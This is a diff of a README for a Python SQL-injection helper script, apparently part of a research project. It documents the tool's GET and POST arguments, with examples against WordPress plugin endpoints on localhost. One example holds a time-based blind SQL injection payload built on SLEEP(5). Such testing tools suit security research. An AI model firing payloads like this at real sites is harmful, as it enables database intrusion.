@@ -1,20 +1,25 @@
 # oracleSQL
 pour PFGimenez/poirot
 ## Utilisation
-retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon
+retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon<br>
+
+**`url`**`string` url of the target<br>
+**`payload`**`dict` default params (GET) or payload (POST)  			`❗ value and key between SIMPLE quotes` <br>
+**`vulnparam`**`string` name of param on which we add injtxt<br>
+**`injtxt`**`string` injection text 									`❗ between DOUBLE quotes`<br>
 #### GET
 ```
-python sqloracl.py [url](string) GET [payload](dict /!\ clés et valeurs entre SIMPLES quotes) [param](string) [injtext](string /!\ entre DOUBLES quotes)
+python sqloracl.py <url> GET <payload> <vulnparam> <injtxt>
 ```
 exemple :
 ```
-python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET {'action':'dt_duplicate_post_as_draft','post':''} post ""
+python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET "{'action':'dt_duplicate_post_as_draft','post':''}" post ""
 ```
 #### POST
 ```
-python sqloracl.py [url](string) GET [payload](dict /!\ clés et valeurs entre SIMPLES quotes) [param](string) [injtext](string /!\ entre DOUBLES quotes)
+python sqloracl.py <url> POST <payload> <vulnparam> <injtxt>
 ```
 exemple :
 ```
-python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST {'action':'spAjaxResults','pollid':'2'} pollid " AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"
+python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST "{'action':'spAjaxResults','pollid':'2'}" pollid " AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"
 ```
